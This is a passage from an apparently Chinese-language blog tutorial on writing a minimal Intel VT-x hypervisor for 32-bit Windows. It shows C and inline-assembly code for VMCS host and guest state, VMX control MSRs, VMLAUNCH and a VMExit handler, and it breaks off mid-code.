进入控制(进入<code>#VMEntry</code> 加载设置)</p><ul><li><p>宿主机执行域</p><p>获取段描述符基址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PVOID <span class="title function_">GetSegmentDescriptor</span><span class="params">(<span class="type">uint16_t</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">KGDTENTRY* GdtEntry = Asm_GetGdtBase();</span><br><span class="line">KGDTENTRY TargetEntry = GdtEntry[index &gt;&gt; <span class="number">3</span>];</span><br><span class="line"><span class="type">uintptr_t</span> ret = TargetEntry.HighWord.Bytes.BaseHi;</span><br><span class="line">ret &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">ret |= TargetEntry.HighWord.Bytes.BaseMid;</span><br><span class="line">ret &lt;&lt;= <span class="number">16</span>;</span><br><span class="line">ret |= TargetEntry.BaseLow;</span><br><span class="line"><span class="keyword">return</span> (PVOID)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>HOST_RSP</code>的值，需要提前申请 </p><p><code>&amp; 0xfff8</code>必须清除RPL，和<code>TI</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__vmx_vmwrite(HOST_CR0, __readcr0());</span><br><span class="line">__vmx_vmwrite(HOST_CR3, __readcr3());</span><br><span class="line">__vmx_vmwrite(HOST_CR4, __readcr4());</span><br><span class="line"></span><br><span class="line">__vmx_vmwrite(HOST_ES_SELECTOR, GetES() &amp; <span class="number">0xFFF8</span>);</span><br><span class="line">__vmx_vmwrite(HOST_CS_SELECTOR, GetCS() &amp; <span class="number">0xFFF8</span>);</span><br><span class="line">__vmx_vmwrite(HOST_DS_SELECTOR, GetDS() &amp; <span class="number">0xFFF8</span>);</span><br><span class="line">__vmx_vmwrite(HOST_FS_SELECTOR, GetFS() &amp; <span class="number">0xFFF8</span>);</span><br><span class="line">__vmx_vmwrite(HOST_GS_SELECTOR, GetGS() &amp; <span class="number">0xFFF8</span>);</span><br><span class="line">__vmx_vmwrite(HOST_SS_SELECTOR, GetSS() &amp; <span class="number">0xFFF8</span>);</span><br><span class="line">__vmx_vmwrite(HOST_TR_SELECTOR, GetTR() &amp; <span class="number">0xFFF8</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// KGDTENTRY* GdtEntry = Asm_GetGdtBase();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__vmx_vmwrite(HOST_TR_BASE, <span class="number">0x80042000</span>);</span><br><span class="line"></span><br><span class="line">__vmx_vmwrite(HOST_GDTR_BASE, Asm_GetGdtBase());</span><br><span class="line">__vmx_vmwrite(HOST_IDTR_BASE, Asm_GetIdtBase());</span><br><span class="line"></span><br><span class="line">__vmx_vmwrite(HOST_IA32_SYSENTER_CS, __readmsr(MSR_IA32_SYSENTER_CS) &amp; <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">__vmx_vmwrite(HOST_IA32_SYSENTER_ESP, __readmsr(MSR_IA32_SYSENTER_ESP) &amp; <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">__vmx_vmwrite(HOST_IA32_SYSENTER_EIP, __readmsr(MSR_IA32_SYSENTER_EIP) &amp; <span class="number">0xFFFFFFFF</span>); <span class="comment">// KiFastCallEntry</span></span><br><span class="line"></span><br><span class="line">__vmx_vmwrite(HOST_RSP, ((ULONG)g_VMXCPU.pStack) + <span class="number">0x2000</span>);     <span class="comment">//Host 临时栈</span></span><br><span class="line">__vmx_vmwrite(HOST_RIP, (ULONG)VMMEntryPoint);                  <span class="comment">//这里定义我们的VMM处理程序入口</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>很好，Intel你要提供<code>HOST_TR_BASE</code>，<code>HOST_FS_BASE</code>，<code>HOST_GS_BASE</code></p><p>如果要它的话需要在GDT表找，然后拼接基地址。</p><p>这里偷了一份KGDTEntry的结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KGDTENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    USHORT LimitLow;                                                        <span class="comment">//0x0</span></span><br><span class="line">    USHORT BaseLow;                                                         <span class="comment">//0x2</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            UCHAR BaseMid;                                                  <span class="comment">//0x4</span></span><br><span class="line">            UCHAR Flags1;                                                   <span class="comment">//0x5</span></span><br><span class="line">            UCHAR Flags2;                                                   <span class="comment">//0x6</span></span><br><span class="line">            UCHAR BaseHi;                                                   <span class="comment">//0x7</span></span><br><span class="line">        &#125; Bytes;                                                            <span class="comment">//0x4</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            ULONG BaseMid : <span class="number">8</span>;                                                <span class="comment">//0x4</span></span><br><span class="line">            ULONG Type : <span class="number">5</span>;                                                   <span class="comment">//0x4</span></span><br><span class="line">            ULONG Dpl : <span class="number">2</span>;                                                    <span class="comment">//0x4</span></span><br><span class="line">            ULONG Pres : <span class="number">1</span>;                                                   <span class="comment">//0x4</span></span><br><span class="line">            ULONG LimitHi : <span class="number">4</span>;                                                <span class="comment">//0x4</span></span><br><span class="line">            ULONG Sys : <span class="number">1</span>;                                                    <span class="comment">//0x4</span></span><br><span class="line">            ULONG Reserved_0 : <span class="number">1</span>;                                             <span class="comment">//0x4</span></span><br><span class="line">            ULONG Default_Big : <span class="number">1</span>;                                            <span class="comment">//0x4</span></span><br><span class="line">            ULONG Granularity : <span class="number">1</span>;                                            <span class="comment">//0x4</span></span><br><span class="line">            ULONG BaseHi : <span class="number">8</span>;                                                 <span class="comment">//0x4</span></span><br><span class="line">        &#125; Bits;                                                             <span class="comment">//0x4</span></span><br><span class="line">    &#125; HighWord;                                                             <span class="comment">//0x4</span></span><br><span class="line">&#125; KGDTENTRY;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//0x10 bytes (sizeof)</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> _<span class="title">KGDTENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        USHORT LimitLow;                                                    <span class="comment">//0x0</span></span><br><span class="line">        USHORT BaseLow;                                                     <span class="comment">//0x2</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        UCHAR BaseMiddle;                                                   <span class="comment">//0x4</span></span><br><span class="line">        UCHAR Flags1;                                                       <span class="comment">//0x5</span></span><br><span class="line">        UCHAR Flags2;                                                       <span class="comment">//0x6</span></span><br><span class="line">        UCHAR BaseHigh;                                                     <span class="comment">//0x7</span></span><br><span class="line">    &#125; Bytes;                                                                <span class="comment">//0x4</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            ULONG BaseMiddle : <span class="number">8</span>;                                                 <span class="comment">//0x4</span></span><br><span class="line">            ULONG Type : <span class="number">5</span>;                                                       <span class="comment">//0x4</span></span><br><span class="line">            ULONG Dpl : <span class="number">2</span>;                                                        <span class="comment">//0x4</span></span><br><span class="line">            ULONG Present : <span class="number">1</span>;                                                    <span class="comment">//0x4</span></span><br><span class="line">            ULONG LimitHigh : <span class="number">4</span>;                                                  <span class="comment">//0x4</span></span><br><span class="line">            ULONG System : <span class="number">1</span>;                                                     <span class="comment">//0x4</span></span><br><span class="line">            ULONG LongMode : <span class="number">1</span>;                                                   <span class="comment">//0x4</span></span><br><span class="line">            ULONG DefaultBig : <span class="number">1</span>;                                                 <span class="comment">//0x4</span></span><br><span class="line">            ULONG Granularity : <span class="number">1</span>;                                                <span class="comment">//0x4</span></span><br><span class="line">            ULONG BaseHigh : <span class="number">8</span>;                                                   <span class="comment">//0x4</span></span><br><span class="line">        &#125; Bits;                                                                 <span class="comment">//0x4</span></span><br><span class="line">        ULONG BaseUpper;                                                    <span class="comment">//0x8</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        ULONG MustBeZero;                                                   <span class="comment">//0xc</span></span><br><span class="line">        LONGLONG DataLow;                                                   <span class="comment">//0x0</span></span><br><span class="line">    &#125;;</span><br><span class="line">    LONGLONG DataHigh;                                                      <span class="comment">//0x8</span></span><br><span class="line">&#125;KGDTENTRY;</span><br></pre></td></tr></table></figure></li><li><p>虚拟机执行控制域</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">`GUEST_ES_AR_BYTES`为ES段的属性，设置为`0x10000`不可用。</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">__vmx_vmwrite(GUEST_CR0, __readcr0());</span><br><span class="line">__vmx_vmwrite(GUEST_CR3, __readcr3());</span><br><span class="line">__vmx_vmwrite(GUEST_CR4, __readcr4());</span><br><span class="line"></span><br><span class="line">__vmx_vmwrite(GUEST_DR7, 0x400);</span><br><span class="line">__vmx_vmwrite(GUEST_RFLAGS, __readeflags() &amp; ~0x200); // IF = 0</span><br><span class="line"></span><br><span class="line">__vmx_vmwrite(GUEST_ES_SELECTOR, GetES() &amp; 0xFFF8);</span><br><span class="line">__vmx_vmwrite(GUEST_CS_SELECTOR, GetCS() &amp; 0xFFF8);</span><br><span class="line">__vmx_vmwrite(GUEST_DS_SELECTOR, GetDS() &amp; 0xFFF8);</span><br><span class="line">__vmx_vmwrite(GUEST_FS_SELECTOR, GetFS() &amp; 0xFFF8);</span><br><span class="line">__vmx_vmwrite(GUEST_GS_SELECTOR, GetGS() &amp; 0xFFF8);</span><br><span class="line">__vmx_vmwrite(GUEST_SS_SELECTOR, GetSS() &amp; 0xFFF8);</span><br><span class="line">__vmx_vmwrite(GUEST_TR_SELECTOR, GetTR() &amp; 0xFFF8);</span><br><span class="line"></span><br><span class="line">// 设置 Segment Unusable</span><br><span class="line">__vmx_vmwrite(GUEST_ES_AR_BYTES, 0x10000);</span><br><span class="line">__vmx_vmwrite(GUEST_FS_AR_BYTES, 0x10000);</span><br><span class="line">__vmx_vmwrite(GUEST_DS_AR_BYTES, 0x10000);</span><br><span class="line">__vmx_vmwrite(GUEST_SS_AR_BYTES, 0x10000);</span><br><span class="line">__vmx_vmwrite(GUEST_GS_AR_BYTES, 0x10000);</span><br><span class="line">__vmx_vmwrite(GUEST_LDTR_AR_BYTES, 0x10000);</span><br><span class="line"></span><br><span class="line">// 需要构造描述符线长、属性等，我要偷大懒</span><br><span class="line">// 在guest里面刷一下选择子</span><br><span class="line">__vmx_vmwrite(GUEST_CS_AR_BYTES, 0xc09b);</span><br><span class="line">__vmx_vmwrite(GUEST_CS_BASE, 0);</span><br><span class="line">__vmx_vmwrite(GUEST_CS_LIMIT, 0xffffffff);</span><br><span class="line"></span><br><span class="line">__vmx_vmwrite(GUEST_TR_AR_BYTES, 0x008b);</span><br><span class="line">__vmx_vmwrite(GUEST_TR_BASE, 0x80042000);</span><br><span class="line">__vmx_vmwrite(GUEST_TR_LIMIT, 0x20ab);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__vmx_vmwrite(GUEST_GDTR_BASE, Asm_GetGdtBase());</span><br><span class="line">__vmx_vmwrite(GUEST_GDTR_LIMIT, Asm_GetGdtLimit());</span><br><span class="line">__vmx_vmwrite(GUEST_IDTR_BASE, Asm_GetIdtBase());</span><br><span class="line">__vmx_vmwrite(GUEST_IDTR_LIMIT, Asm_GetIdtLimit());</span><br><span class="line"></span><br><span class="line">__vmx_vmwrite(GUEST_IA32_DEBUGCTL, __readmsr(MSR_IA32_DEBUGCTL) &amp; 0xFFFFFFFF);</span><br><span class="line">__vmx_vmwrite(GUEST_IA32_DEBUGCTL_HIGH, __readmsr(MSR_IA32_DEBUGCTL) &gt;&gt; 32);</span><br><span class="line"></span><br><span class="line">__vmx_vmwrite(GUEST_SYSENTER_CS, __readmsr(MSR_IA32_SYSENTER_CS) &amp; 0xFFFFFFFF);</span><br><span class="line">__vmx_vmwrite(GUEST_SYSENTER_ESP, __readmsr(MSR_IA32_SYSENTER_ESP) &amp; 0xFFFFFFFF);</span><br><span class="line">__vmx_vmwrite(GUEST_SYSENTER_EIP, __readmsr(MSR_IA32_SYSENTER_EIP) &amp; 0xFFFFFFFF); // KiFastCallEntry</span><br><span class="line"></span><br><span class="line">__vmx_vmwrite(GUEST_RSP, ((ULONG)g_cpu.pStack) + 0x1000);     //Guest 临时栈</span><br><span class="line">__vmx_vmwrite(GUEST_RIP, (ULONG)GuestEntry);                     // 客户机的入口点</span><br><span class="line"></span><br><span class="line">// 物理地址意义上的nullptr</span><br><span class="line">__vmx_vmwrite(VMCS_LINK_POINTER, 0xffffffff);</span><br><span class="line">__vmx_vmwrite(VMCS_LINK_POINTER_HIGH, 0xffffffff);</span><br></pre></td></tr></table></figure><p><code>GuestEntry</code>是GUEST VM的入口点</p><p> <code>__vmx_vmread(VM_INSTRUCTION_ERROR)</code>@24.9.1</p><ul><li><p>VM 控制域</p><p>通过设置<code>Flags</code>标志位来控制VM的一些行为，Intel为了防止你写玩具VMM的时候把这段全填0，贴心的设置了一些预留位需要置1的位，真好。</p><p>通过查询MSR寄存器来了解哪些预留位为1，哪些为0</p><p>比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; rdmsr 481</span><br><span class="line">msr[481] = 0000003f`00000016</span><br><span class="line">kd&gt; .formats 0000003f`00000016</span><br><span class="line">Evaluate expression:</span><br><span class="line">  Hex:     0000003f`00000016</span><br><span class="line">  Decimal: 270582939670</span><br><span class="line">  Octal:   0000000003740000000026</span><br><span class="line">  Binary:  00000000 00000000 00000000 00111111 00000000 00000000 00000000 00010110</span><br><span class="line">  Chars:   ...?....</span><br><span class="line">  Time:    Mon Jan  1 15:30:58.293 1601 (UTC + 8:00)</span><br><span class="line">  Float:   low 3.08286e-044 high 8.82818e-044</span><br><span class="line">  Double:  1.33686e-312</span><br></pre></td></tr></table></figure><p>MSR值中前32位中二进制为0的位，设置对应域时该位必须为0</p><p>MSR值中后32位中二进制为1的位，设置对应域时该位必须为1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ULONG <span class="title function_">VTAdjustExcuteControls</span><span class="params">(ULONG Value,ULONG msr)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint64_t</span> mask = __readmsr(msr);</span><br><span class="line">Value &amp;= (mask &gt;&gt; <span class="number">32</span>);</span><br><span class="line">Value |= (mask &amp; <span class="number">0xffffffff</span>);</span><br><span class="line"><span class="keyword">return</span> Value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>VM 执行控制</p><p><code>Pin-Based VM-Execution Controls</code> 基于CPU针脚的VM执行控制 （Intel 3a @24.6.1）</p><p>定义发生外部中断、NMI等的是否退出虚拟机。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__vmx_vmwrite(PIN_BASED_VM_EXEC_CONTROL, VTAdjustExcuteControls(<span class="number">0</span>, MSR_IA32_VMX_PINBASED_CTLS));</span><br></pre></td></tr></table></figure><p><code>Processor-Based VM-Execution Controls</code> 基于处理器的VM执行控制（Intel 3a @24.6.2）</p><p>定义执行一些CPU指令（<code>HLT/INVLPG/RDTSC/CR3切换/内部中断</code>）是否需要退出虚拟机</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__vmx_vmwrite(CPU_BASED_VM_EXEC_CONTROL, VTAdjustExcuteControls(<span class="number">0</span>, MSR_IA32_VMX_PROCBASED_CTLS));</span><br></pre></td></tr></table></figure></li><li><p>VM 退出控制 </p><p>Intel <a href="mailto:&#x33;&#x61;&#64;&#x32;&#52;&#46;&#x37;&#46;&#x31;">&#x33;&#x61;&#64;&#x32;&#52;&#46;&#x37;&#46;&#x31;</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__vmx_vmwrite(VM_EXIT_CONTROLS, VTAdjustExcuteControls(<span class="number">0</span>,MSR_IA32_VMX_EXIT_CTLS));</span><br></pre></td></tr></table></figure></li><li><p>VM 进入控制</p><p>Intel <a href="mailto:&#x33;&#97;&#x40;&#x32;&#x34;&#x2e;&#x37;&#x2e;&#x31;">&#x33;&#97;&#x40;&#x32;&#x34;&#x2e;&#x37;&#x2e;&#x31;</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__vmx_vmwrite(VM_ENTRY_CONTROLS, VTAdjustExcuteControls(<span class="number">0</span>, MSR_IA32_VMX_ENTRY_CTLS));</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="0x06-VM-启动"><a href="#0x06-VM-启动" class="headerlink" title="0x06 VM 启动"></a>0x06 VM 启动</h3><p>启动后，CPU会跳到<code>GUEST_RIP</code>，ESP设置为<code>GUEST_RSP</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__asm&#123;</span><br><span class="line">    pushad</span><br><span class="line">    pushfd</span><br><span class="line">    mov guest_sp,esp</span><br><span class="line">    mov guest_ip, offset Ret</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// VMLANUCH 虚拟机启动，跳转到 GuestEntry 就不回来了</span></span><br><span class="line">__vmx_vmlaunch();</span><br><span class="line"><span class="comment">// 这条指令下的语句不会执行</span></span><br><span class="line">DbgPrint(<span class="string">&quot;VT Failed With Error Code: 0x%x&quot;</span>,__vmx_vmread(VM_INSTRUCTION_ERROR));</span><br><span class="line"><span class="comment">// 这里的Ret是用来接收跳转，正常返回</span></span><br><span class="line">Ret:</span><br><span class="line">__asm&#123;</span><br><span class="line">popfd</span><br><span class="line">popad</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>GuestEntry</code>的定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__declspec(naked) <span class="type">void</span> <span class="title function_">GuestEntry</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">__asm &#123;</span><br><span class="line"></span><br><span class="line">mov ax, es</span><br><span class="line">mov es, ax</span><br><span class="line"></span><br><span class="line">mov ax, ds</span><br><span class="line">mov ds, ax</span><br><span class="line"></span><br><span class="line">mov ax, fs</span><br><span class="line">mov fs, ax</span><br><span class="line"></span><br><span class="line">mov ax, gs</span><br><span class="line">mov gs, ax</span><br><span class="line"></span><br><span class="line">mov ax, ss</span><br><span class="line">mov ss, ax</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__asm &#123;</span><br><span class="line"></span><br><span class="line">mov esp, guest_sp</span><br><span class="line">jmp guest_ip</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0x06-VMExit"><a href="#0x06-VMExit" class="headerlink" title="0x06 #VMExit"></a>0x06 #VMExit</h3><p>当虚拟机执行到设置的<code>#VMExit</code>的指令后，会退出虚拟机，执行<code>HOST_RIP</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">__declspec(naked) <span class="type">void</span> <span class="title function_">VMExitHandler</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">__asm &#123;</span><br><span class="line">mov g_GuestRegs.eax, eax</span><br><span class="line">mov g_GuestRegs.ecx, ecx</span><br><span class="line">mov g_GuestRegs.edx, edx</span><br><span class="line">mov g_GuestRegs.ebx, ebx</span><br><span class="line">mov g_GuestRegs.esp, esp</span><br><span class="line">mov g_GuestRegs.ebp, ebp</span><br><span class="line">mov g_GuestRegs.esi, esi</span><br><span class="line">mov g_GuestRegs.edi, edi</span><br><span class="line"></span><br><span class="line">pushfd</span><br><span class="line">pop eax</span><br><span class="line">mov g_GuestRegs.eflags, eax</span><br><span class="line"></span><br><span class="line">mov ax, fs</span><br><span class="line">mov fs, ax</span><br><span class="line">mov ax, gs</span><br><span class="line">mov gs, ax</span><br><span class="line">&#125;</span><br><span class="line">VMExitHandlerDispatcher();</span><br><span class="line">__asm &#123;</span><br><span class="line">mov  eax, g_GuestRegs.eax</span><br><span class="line">mov  ecx, g_GuestRegs.ecx</span><br><span class="line">mov  edx, g_GuestRegs.edx</span><br><span class="line">mov  ebx, g_GuestRegs.ebx</span><br><span class="line">mov  esp, g_GuestRegs.esp</span><br><span class="line">mov  ebp, g_GuestRegs.ebp</span><br><span class="line">mov  esi, g_GuestRegs.esi</span><br><span class="line">mov  edi, g_GuestRegs.edi</span><br><span class="line"></span><br><span class="line"><span class="comment">//vmresume</span></span><br><span class="line">__emit <span class="number">0x0f</span></span><br><span class="line">__emit <span class="number">0x01</span></span><br><span class="line">__emit <span class="number">0xc3</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>VMExitHandlerDispatcher</code>函数用于处理<code>#VMExit</code>事件：</p><p><code>ExitReason</code>指定了退出原因。</p><p><code>ExitInstructionLength</code>指定了导致退出指令的长度。</p><p><code>g_GuestRegs.eip = __vmx_vmread(GUEST_RIP);</code>读取了导致退出指令的地址。</p><p>处理完指令的退出后，设置<code>GUEST_RIP</code>为下一跳指令。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span>  <span class="title function_">VMExitHandlerDispatcher</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">ULONG ExitReason;</span><br><span class="line">ULONG ExitInstructionLength;</span><br><span class="line">ULONG GuestResumeEIP;</span><br><span class="line"></span><br><span class="line">ExitReason = __vmx_vmread(VM_EXIT_REASON);</span><br><span class="line">ExitInstructionLength = __vmx_vmread(VM_EXIT_INSTRUCTION_LEN);</span><br><span class="line"></span><br><span class="line">g_GuestRegs.eflags = __vmx_vmread(GUEST_RFLAGS);</span><br><span class="line">g_GuestRegs.esp = 